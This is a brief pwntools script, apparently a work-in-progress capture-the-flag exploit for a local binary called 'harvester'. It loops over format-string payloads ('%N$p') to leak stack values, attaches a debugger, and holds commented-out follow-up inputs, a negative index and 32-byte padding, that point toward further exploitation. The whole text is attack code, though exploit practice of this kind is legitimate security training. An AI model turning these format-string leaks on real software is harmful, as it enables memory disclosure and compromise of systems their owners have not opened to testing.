from pwn import *

c = process("./harvester")

def leak():
	i = 1
	while i < 40:
		c.sendline("1")
		c.sendline("%%%d$p" % i)
		c.recvuntil("\nYour choice is: ")
		print(c.recv(), str(i))
		i += 1

leak()
gdb.attach(c)
input()
#c.sendline("2")
#c.sendline("y")
#c.sendline("-11")
#c.sendline("3")
#c.sendline(b"A"*32)
